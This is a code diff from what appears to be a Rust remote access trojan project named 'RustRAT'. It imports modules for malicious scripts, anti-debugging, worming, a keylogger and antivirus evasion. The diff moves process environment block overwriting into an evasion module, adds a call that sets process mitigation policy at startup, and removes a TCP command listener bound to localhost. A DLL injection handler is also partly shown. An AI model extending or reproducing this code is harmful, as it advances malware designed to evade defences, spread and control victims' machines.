@@ -6,7 +6,7 @@ mod maliciousScripts;
 mod AntiDebugChecks;
 mod MayDay;
 mod Worming;
-mod peb_write;
+mod AV_Evasion_adv;
 
 
 // use keylogger::keylogger::keylog;
@@ -30,8 +30,8 @@ use std::net::Shutdown;
 use std::net::{TcpStream,TcpListener};
 use std::process::Command;
 use RustRAT::check;
-use peb_write::peb_overwrite;
-
+use AV_Evasion_adv::peb_write::peb_overwrite;
+use AV_Evasion_adv::process_dynamic_policy::set_policy;
 const ADDR:Ipv4Addr = Ipv4Addr::new(127,0,0,1);
 //This is the constant address made for the socket
 const PORT:u16 = 8080;
@@ -52,27 +52,6 @@ impl ULARGE_INTEGER{
     }
 
     }
-fn connect()->io::Result<()>{
-    println!("Starting listening.....");
-
-    let listener = TcpListener::bind((ADDR,PORT))?;
-    println!("Listening....");
-
-    for stream in listener.incoming(){
-        match stream {
-            Ok(stream) => {
-                println!("Connected print in hiding");
-                if let Err(e) = handle_commands(stream){
-                    eprintln!("Error handling connection: {}",e);
-                }
-            }
-            Err(e) =>{
-                eprintln!("Error handled!!");
-            }
-        }
-    }
-    Ok(())
-}
 fn handle_dll_injection(){
     println!("Enter <processName> <DllName> : ");
     let mut input = String::new();
@@ -191,6 +170,7 @@ fn main(){
     //Work area
     check();
     peb_overwrite();
+    set_policy();
     
 
 
